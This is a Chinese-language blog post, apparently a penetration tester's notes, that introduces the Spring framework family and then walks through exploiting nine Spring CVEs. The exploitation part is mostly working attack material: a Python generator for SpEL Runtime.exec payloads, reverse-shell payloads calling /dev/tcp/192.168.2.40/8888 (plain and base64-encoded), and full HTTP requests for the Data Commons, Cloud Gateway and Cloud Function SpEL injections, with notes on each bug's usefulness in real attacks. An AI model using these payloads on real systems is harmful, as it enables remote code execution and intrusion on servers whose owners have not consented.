<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="noindex, nofollow"><title>Spring | 养猪日记</title>
<meta name=keywords content><meta name=description content="一、Spring生态
Spring开源框架由Rod Johnson创建，从简单性、可测试性和松耦合的角度而言， 任何Java应用都可以从Spring中受益。 时至今日Spring已不再是一个简单的编程框架了，在整个Spring生态中包含了许多 应用在特定场景的具体框架，如：“Spring Framework”，“Spring Security”，“Spring Boot”，“Spring Cloud”等等，其中“Spring Framework”框架是 整个生态的核心基础，每个框架都有自己独立的代码仓库。
Spring生态系统提供许多有用的编程框架或工具集。 当下最为流行的Spring项目： Spring Framework，Spring Security，Spring Boot，Spring Cloud等。
Spring Framework
Spring Framework项目是整个Spring生态的基础，Spring Framework项目又包含多个子模块，如：spring-core，spring-beans，spring-context，spring-aop，spring web，spring-webmvc等等。
Spring Boot
Spring Boot是一个开发基于Spring Framework的项目，它默认集成了嵌入式 Tomcat，配置注解化，支持快速集成第三方开发组件（如MyBatis），大大降低了使用 Spring的门槛，而且内置了许多可以直接用于生产环境的功能，是目前用于开发微服务架构项目的不二选择。
Spring Cloud
Spring Cloud为开发基于微服务架构的软件系统提供了一整套工具集合，其中包含了开发各个微服务组件的具体项目，如：Spring Cloud Config（配置中心），Spring Cloud Netflix（服务注册中心），Spring Cloud Sleuth（服务调用监控），Spring Cloud Gateway（服务网关）等等。 Spring Cloud的基础是Spring Boot，基于Spring Boot可以大大简化开发各微服务组件 的流程。
Spring Security
Spring Security是用于实现认证和授权，以及访问控制的安全框架，在Java生态与之提 供类似的功能还有一个框架：Apache Shiro。 Spring Security依赖于Spring Framework，也就是说如果要使用Spring Security，那 么应用架构也必须是基于Spring Framework的，这大大限制了Spring Security的使用场景；反之，Shiro就没有这样限制，而且从项目架构上Shiro更加简洁。当然，Spring Security提供了非常丰富的安全控制的功能，在某些方面甚至比Shiro更加完善，与之对 应的是掌握的Spring Security的复杂度比较大。因此，对于在应用中是否选择Spring Security需要根据实际需求来决定。
二、漏洞原理
Spring于2002年最早提出并随后创建，2009年9月Spring 3.0 RC1发布后，Spring就引入了SpEL (Spring Expression Language)。SpEL(Spring Expression Language)是基于spring的一个表达式语言，类似于struts的OGNL，能够在运行时动态执行一些运算甚至一些指令，类似于Java的反射功能。"><meta name=author content="养猪日记"><link rel=canonical href=http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/spring/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/spring/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=分类><span>分类</span></a></li><li><a href=http://localhost:1313/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Spring</h1><div class=post-meta><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;570 words&nbsp;·&nbsp;养猪日记</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#spring-framework>Spring Framework</a></li><li><a href=#spring-boot>Spring Boot</a></li><li><a href=#spring-cloud>Spring Cloud</a></li><li><a href=#spring-security>Spring Security</a></li></ul><ul><li><a href=#1spring-security-oauth2远程命令执行-cve-2016-4977>1、Spring Security OAuth2远程命令执行 CVE-2016-4977</a></li><li><a href=#2spring-web-flow框架远程代码执行cve-2017-4971>2、Spring Web Flow框架远程代码执行(CVE-2017-4971)</a></li><li><a href=#3spring-data-rest远程命令执行命令cve-2017-8046>3、Spring Data Rest远程命令执行命令（CVE-2017-8046）</a></li><li><a href=#4spring-messaging远程命令执行突破cve-2018-1270>4、Spring Messaging远程命令执行突破（CVE-2018-1270）</a></li><li><a href=#5spring-data-commons-远程命令执行漏洞cve-2018-1273>5、Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</a></li><li><a href=#6spring-cloud-gateway-actuator-api-spel表达式注入命令执行cve-2022-22947>6、Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）</a><ul><li><a href=#第一步添加路由>第一步添加路由：</a></li><li><a href=#第二步刷新路由>第二步刷新路由：</a></li><li><a href=#第三步查看命令>第三步查看命令：</a></li><li><a href=#第四步删除路由>第四步删除路由：</a></li></ul></li><li><a href=#7spring-cloud-function-spel-表达式注入-cve-2022-22963>7、Spring Cloud Function SpEL 表达式注入 CVE-2022-22963</a></li><li><a href=#8spring框架data-binding与jdk-9导致的远程代码执行漏洞cve-2022-22965-也就是spring-core-rce>8、Spring框架Data Binding与JDK 9+导致的远程代码执行漏洞（CVE-2022-22965） 也就是Spring core RCE</a></li><li><a href=#9spring-security-authorizationcve-2022-22978>9、Spring Security Authorization(CVE-2022-22978)</a></li></ul></nav></div></details></div><div class=post-content><h1 id=一spring生态>一、Spring生态<a hidden class=anchor aria-hidden=true href=#一spring生态>#</a></h1><p>Spring开源框架由Rod Johnson创建，从简单性、可测试性和松耦合的角度而言， 任何Java应用都可以从Spring中受益。 时至今日Spring已不再是一个简单的编程框架了，在整个Spring生态中包含了许多 应用在特定场景的具体框架，如：“Spring Framework”，“Spring Security”，“Spring Boot”，“Spring Cloud”等等，其中“Spring Framework”框架是 整个生态的核心基础，每个框架都有自己独立的代码仓库。</p><p>Spring生态系统提供许多有用的编程框架或工具集。 当下最为流行的Spring项目： Spring Framework，Spring Security，Spring Boot，Spring Cloud等。</p><h2 id=spring-framework>Spring Framework<a hidden class=anchor aria-hidden=true href=#spring-framework>#</a></h2><p>Spring Framework项目是整个Spring生态的基础，Spring Framework项目又包含多个子模块，如：spring-core，spring-beans，spring-context，spring-aop，spring web，spring-webmvc等等。</p><h2 id=spring-boot>Spring Boot<a hidden class=anchor aria-hidden=true href=#spring-boot>#</a></h2><p>Spring Boot是一个开发基于Spring Framework的项目，它默认集成了嵌入式 Tomcat，配置注解化，支持快速集成第三方开发组件（如MyBatis），大大降低了使用 Spring的门槛，而且内置了许多可以直接用于生产环境的功能，是目前用于开发微服务架构项目的不二选择。</p><h2 id=spring-cloud>Spring Cloud<a hidden class=anchor aria-hidden=true href=#spring-cloud>#</a></h2><p>Spring Cloud为开发基于微服务架构的软件系统提供了一整套工具集合，其中包含了开发各个微服务组件的具体项目，如：Spring Cloud Config（配置中心），Spring Cloud Netflix（服务注册中心），Spring Cloud Sleuth（服务调用监控），Spring Cloud Gateway（服务网关）等等。 Spring Cloud的基础是Spring Boot，基于Spring Boot可以大大简化开发各微服务组件 的流程。</p><h2 id=spring-security>Spring Security<a hidden class=anchor aria-hidden=true href=#spring-security>#</a></h2><p>Spring Security是用于实现认证和授权，以及访问控制的安全框架，在Java生态与之提 供类似的功能还有一个框架：Apache Shiro。 Spring Security依赖于Spring Framework，也就是说如果要使用Spring Security，那 么应用架构也必须是基于Spring Framework的，这大大限制了Spring Security的使用场景；反之，Shiro就没有这样限制，而且从项目架构上Shiro更加简洁。当然，Spring Security提供了非常丰富的安全控制的功能，在某些方面甚至比Shiro更加完善，与之对 应的是掌握的Spring Security的复杂度比较大。因此，对于在应用中是否选择Spring Security需要根据实际需求来决定。</p><h1 id=二漏洞原理>二、漏洞原理<a hidden class=anchor aria-hidden=true href=#二漏洞原理>#</a></h1><p>Spring于2002年最早提出并随后创建，2009年9月Spring 3.0 RC1发布后，Spring就引入了SpEL (Spring Expression Language)。SpEL(Spring Expression Language)是基于spring的一个表达式语言，类似于struts的OGNL，能够在运行时动态执行一些运算甚至一些指令，类似于Java的反射功能。</p><h1 id=三漏洞利用>三、漏洞利用<a hidden class=anchor aria-hidden=true href=#三漏洞利用>#</a></h1><h2 id=1spring-security-oauth2远程命令执行-cve-2016-4977>1、Spring Security OAuth2远程命令执行 CVE-2016-4977<a hidden class=anchor aria-hidden=true href=#1spring-security-oauth2远程命令执行-cve-2016-4977>#</a></h2><p>oauth/authorize路径下，认证后漏洞，所以实战需要先爆破或者获取密码，也可以认为漏洞特征，发现可配合插件进行发现</p><p>影响版本：</p><p>2.0.0-2.0.9
1.0.0-1.0.5</p><p>POC生成脚本：</p><pre tabindex=0><code>#!/usr/bin/env python
import base64
message = input(&#39;Enter message to encode:&#39;)
message = &#39;bash -c {echo,%s}|{base64,-d}|{bash,-i}&#39; % bytes.decode(base64.b64encode(message.encode(&#39;utf-8&#39;)))
print(message)
poc = &#39;${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&#39; % ord(message[0])
for ch in message[1:]:
   poc += &#39;.concat(T(java.lang.Character).toString(%s))&#39; % ord(ch)
poc += &#39;)}&#39;
print(poc)
</code></pre><p><img loading=lazy src=/zj_img/WEBRESOURCE99c0ca1e0c911ba4a490361b1b7cf0a8%e6%88%aa%e5%9b%be.png alt></p><p><img loading=lazy src=/zj_img/WEBRESOURCE3f8fbf5a7c0ac5e5c246fa4f9110237e%e6%88%aa%e5%9b%be.png alt></p><p><img loading=lazy src=/zj_img/WEBRESOURCE9f7078dae3c0057b578bbc87aadba8c8%e6%88%aa%e5%9b%be.png alt></p><h2 id=2spring-web-flow框架远程代码执行cve-2017-4971>2、Spring Web Flow框架远程代码执行(CVE-2017-4971)<a hidden class=anchor aria-hidden=true href=#2spring-web-flow框架远程代码执行cve-2017-4971>#</a></h2><p>Spring Web Flow是Spring的一个子项目，主要目的是解决跨越多个请求的、用户与服务器之间的、有状态交互问题，提供了描述业务流程的抽象能力，Spring WebFlow是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其2.4.0 - 2.4.4 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p><p>POC：</p><pre tabindex=0><code>原POC:
&amp;_(new java.lang.ProcessBuilder(&#34;bash&#34;,&#34;-c&#34;,&#34;bash -i &gt;&amp; /dev/tcp/192.168.2.40/8888 0&gt;&amp;1&#34;)).start()=vulhub

URL编码后：
&amp;_(new java.lang.ProcessBuilder(&#34;bash&#34;,&#34;-c&#34;,&#34;bash+-i+&gt;%26+/dev/tcp/192.168.2.40/8888 0&gt;%261&#34;)).start()=vulhub
</code></pre><p><strong>但是该漏洞，暂无良好的发现or扫描方式，导致实用性极差.</strong></p><h2 id=3spring-data-rest远程命令执行命令cve-2017-8046>3、Spring Data Rest远程命令执行命令（CVE-2017-8046）<a hidden class=anchor aria-hidden=true href=#3spring-data-rest远程命令执行命令cve-2017-8046>#</a></h2><p>简单介绍：</p><p>Spring Data是对数据访问的更高抽象。通过它，开发者进一步从数据层解放出来，更专注于业务逻辑。不管是关系型数据还是非关系型数据，利用相应接口，开发者可以使用非常简单的代码构建对数据的访问。</p><p>漏洞原理：</p><p>Pivotal官方发布通告表示Spring-data-rest服务器在处理PATCH请求时存在一个远程代码执行漏洞（CVE-2017-8046）。攻击者可以构造恶意的PATCH请求并发送给spring-date-rest服务器，通过构造好的JSON数据来执行任意Java代码。</p><p>影响版本：</p><p>Spring Data REST versions &lt; 2.5.12, 2.6.7, 3.0 RC3</p><p>Spring Boot version &lt; 2.0.0M4</p><p>Spring Data release trains &lt; Kay-RC3</p><p>可能特征：</p><p>Restful风格的API服务器</p><p>POC：</p><p>第一步：</p><pre tabindex=0><code>&#34;,&#34;.join(map(str, (map(ord,&#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNDAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}&#34;))))
</code></pre><p>第二步十进制编码：</p><p><img loading=lazy src=/zj_img/WEBRESOURCEd189de73ccdc0cac505cc8182e7c3bc5%e6%88%aa%e5%9b%be.png alt></p><p>第三步：</p><p><img loading=lazy src=/zj_img/WEBRESOURCEba857f96719eeb5128fe8b3ad93a74a6%e6%88%aa%e5%9b%be.png alt></p><p><strong>该漏洞因为涉及编码等问题，以及无明显特征，同样实用性较低</strong></p><h2 id=4spring-messaging远程命令执行突破cve-2018-1270>4、Spring Messaging远程命令执行突破（CVE-2018-1270）<a hidden class=anchor aria-hidden=true href=#4spring-messaging远程命令执行突破cve-2018-1270>#</a></h2><p>Spring框架中的 spring-messaging 模块提供了一种基于WebSocket的STOMP协议实现，STOMP消息代理在处理客户端消息时存在SpEL表达式注入漏洞，在spring messages中，其允许客户端订阅消息，并使用selector过滤消息，selector用SpEL表达编写，并使用StandardEvaluationContext解析，攻击者可以通过构造恶意的消息来实现远程代码执行。</p><p>影响范围：</p><p>Spring Framework 5.0 to 5.0.4.</p><p>Spring Framework 4.3 to 4.3.14</p><p><strong>该漏洞实战能力极弱</strong></p><h2 id=5spring-data-commons-远程命令执行漏洞cve-2018-1273>5、Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）<a hidden class=anchor aria-hidden=true href=#5spring-data-commons-远程命令执行漏洞cve-2018-1273>#</a></h2><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。</p><p>影响范围：</p><p>Spring Data Commons 1.13至1.13.10（Ingalls SR10）</p><p>Spring Data REST 2.6至2.6.10（Ingalls SR10）</p><p>Spring Data Commons 2.0至2.0.5（Kay SR5）</p><p>Spring Data REST 3.0至3.0.5（Kay SR5）</p><p>POC:</p><pre tabindex=0><code>POST /users?page=&amp;size=5 HTTP/1.1
Host: 192.168.2.66:8080
Connection: keep-alive
Content-Length: 124
Pragma: no-cache
Cache-Control: no-cache
Origin: http://localhost:8080
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://localhost:8080/users?page=0&amp;size=5
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

username[#this.getClass().forName(&#34;java.lang.Runtime&#34;).getRuntime().exec(&#34;touch /tmp/success&#34;)]=&amp;password=&amp;repeatedPassword=
</code></pre><p><strong>该漏洞反弹shell，需要使用文件下载脚本，配合执行进行上线，同时无法判断漏洞特征，所以同样实用性较弱</strong></p><h2 id=6spring-cloud-gateway-actuator-api-spel表达式注入命令执行cve-2022-22947>6、Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）<a hidden class=anchor aria-hidden=true href=#6spring-cloud-gateway-actuator-api-spel表达式注入命令执行cve-2022-22947>#</a></h2><p>Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。</p><p>漏洞发现：</p><p>/actuator/gateway/路径未授权</p><p>漏洞利用：</p><p>手动需要分多步：</p><h3 id=第一步添加路由>第一步添加路由：<a hidden class=anchor aria-hidden=true href=#第一步添加路由>#</a></h3><pre tabindex=0><code>POST /actuator/gateway/routes/hacktest HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 329

{
  &#34;id&#34;: &#34;hacktest&#34;,
  &#34;filters&#34;: [{
    &#34;name&#34;: &#34;AddResponseHeader&#34;,
    &#34;args&#34;: {
      &#34;name&#34;: &#34;Result&#34;,
      &#34;value&#34;: &#34;#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\&#34;id\&#34;}).getInputStream()))}&#34;
    }
  }],
  &#34;uri&#34;: &#34;http://example.com&#34;
}
</code></pre><p><img loading=lazy src=/zj_img/WEBRESOURCEc9d04e3193ba7d67a1469dd004d07f8d%e6%88%aa%e5%9b%be.png alt></p><h3 id=第二步刷新路由>第二步刷新路由：<a hidden class=anchor aria-hidden=true href=#第二步刷新路由>#</a></h3><pre tabindex=0><code>POST /actuator/gateway/refresh HTTP/1.1
Host: 192.168.2.66:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 0
</code></pre><p><img loading=lazy src=/zj_img/WEBRESOURCE0c2424564c990f5f0cbe87e0fdda917d%e6%88%aa%e5%9b%be.png alt></p><h3 id=第三步查看命令>第三步查看命令：<a hidden class=anchor aria-hidden=true href=#第三步查看命令>#</a></h3><pre tabindex=0><code>GET /actuator/gateway/routes/ HTTP/1.1
Host: 192.168.2.66:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 0
</code></pre><p><img loading=lazy src=/zj_img/WEBRESOURCEa58b1c4b26327430c4bd453ade6fac2d%e6%88%aa%e5%9b%be.png alt></p><h3 id=第四步删除路由>第四步删除路由：<a hidden class=anchor aria-hidden=true href=#第四步删除路由>#</a></h3><pre tabindex=0><code>DELETE /actuator/gateway/routes/hacktest HTTP/1.1
Host: 192.168.2.66:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 0

 
</code></pre><p><img loading=lazy src=/zj_img/WEBRESOURCE9bae7b9e290ff120c2e82989851572de%e6%88%aa%e5%9b%be.png alt></p><p>刷新后，重新访问：</p><p><img loading=lazy src=/zj_img/WEBRESOURCE6f7ece131ca1d0ef650051a88b8644a1%e6%88%aa%e5%9b%be.png alt></p><p>目前有发现直接反弹shell工具，以及数量不多的内存马工具。</p><p><img loading=lazy src=/zj_img/WEBRESOURCEa1c9f9076ad61c8e82f5a8cd8b08da81%e6%88%aa%e5%9b%be.png alt></p><h2 id=7spring-cloud-function-spel-表达式注入-cve-2022-22963>7、Spring Cloud Function SpEL 表达式注入 CVE-2022-22963<a hidden class=anchor aria-hidden=true href=#7spring-cloud-function-spel-表达式注入-cve-2022-22963>#</a></h2><p>Spring Cloud Function是基于Spring Boot 的函数计算框架（FaaS）,当其启用动态路由functionRoute时，HTTP请求头spring.cloud.function.routing-expression参数存在SPEL表达式注入漏洞，恶意攻击者可通过此漏洞发送恶意请求，在服务器执行任意代码。</p><p>3.0.0.M3 &lt;= Spring Cloud Function &lt;=3.2.2</p><p>POC:</p><pre tabindex=0><code>POST /functionRouter HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&#34;touch /tmp/success&#34;)
Content-Type: text/plain
Content-Length: 4

test
</code></pre><p>反弹shell，需要base64规避字符串分割问题：</p><pre tabindex=0><code>POST /functionRouter HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNDAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}&#34;)
Content-Type: text/plain
Content-Length: 4

test
</code></pre><p>此漏洞较为简单，插件可扫描，为重点关注对象。但插件检测结果欠佳，python命令行工具可检测：</p><p><img loading=lazy src=/zj_img/WEBRESOURCE604f0f4ede3055ab59afdede62ca7a1c%e6%88%aa%e5%9b%be.png alt></p><h2 id=8spring框架data-binding与jdk-9导致的远程代码执行漏洞cve-2022-22965-也就是spring-core-rce>8、Spring框架Data Binding与JDK 9+导致的远程代码执行漏洞（CVE-2022-22965） 也就是Spring core RCE<a hidden class=anchor aria-hidden=true href=#8spring框架data-binding与jdk-9导致的远程代码执行漏洞cve-2022-22965-也就是spring-core-rce>#</a></h2><p>SpringMVC支持将HTTP请求中的的请求参数或者请求体内容，根据Controller方法的参数，自动完成类型转换和赋值，同时SpringMVC支持多层嵌套的参数绑定。攻击者通过HTTP请求修改日志文件的文件名、文件内容、文件后缀、文件存放路径参数的值，从而在服务器生成木马文件，造成RCE。</p><p>影响范围：</p><p>JDK版本：JDK 9+</p><p>Spring Framework版本：</p><p>Spring Framework 5.3.X &lt; 5.3.18</p><p>Spring Framework 5.2.X &lt; 5.2.20</p><p>注：其他小版本未更新均受影响</p><p>影响中间件：Tomcat</p><p>检测方式：插件+python工具</p><p>坑点：1、插件告知可能存在漏洞；</p><p><img loading=lazy src=/zj_img/WEBRESOURCE2491adc27093d37527542e019ecf7aef%e6%88%aa%e5%9b%be.png alt></p><p>2、由于漏洞原理，造成可能要扫描多次的情况出现：</p><p><img loading=lazy src=/zj_img/WEBRESOURCE98bd279d223b904a3f324692b286153c%e6%88%aa%e5%9b%be.png alt></p><h2 id=9spring-security-authorizationcve-2022-22978>9、Spring Security Authorization(CVE-2022-22978)<a hidden class=anchor aria-hidden=true href=#9spring-security-authorizationcve-2022-22978>#</a></h2><p>目前来看是垃圾洞</p><p>POC：</p><pre tabindex=0><code>%0a
http://your-ip:8080/admin/%0atest
</code></pre></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/shiro/><span class=title>« Prev</span><br><span>shiro</span>
</a><a class=next href=http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/struts2/><span class=title>Next »</span><br><span>Struts2</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>养猪日记</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>